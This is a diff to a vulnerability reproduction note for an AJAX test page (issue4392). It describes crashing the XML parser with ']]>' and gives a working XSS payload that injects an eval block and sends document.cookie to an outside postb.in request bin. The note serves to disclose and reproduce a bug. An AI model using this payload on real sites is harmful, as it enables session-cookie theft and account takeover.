@@ -18,4 +18,4 @@ into the input field.
 
 Open the url <http://localhost:8080/ajax/issue4392.xhtml>, enter `]]>` and click at the button to see the XML parser crashing (denial of service).
 
-However, this vulnerability might also be used to inject arbitrary javascript (XSS). Just enter `]]></update><eval><![CDATA[window.open("https://postb.in/Kva1OZoi?cookie="+encodeURIComponent(document.cookie));]]></eval><update><![CDATA[` and see how your cookies have been sent to https://postb.in/b/Kva1OZoi.
+However, this vulnerability might also be used to inject arbitrary javascript (XSS). Just enter `]]></update><eval><![CDATA[window.open("https://postb.in/Lsmfz95D?cookie="+encodeURIComponent(document.cookie));]]></eval><update><![CDATA[` and see how your cookies have been sent to https://postb.in/b/Lsmfz95D.
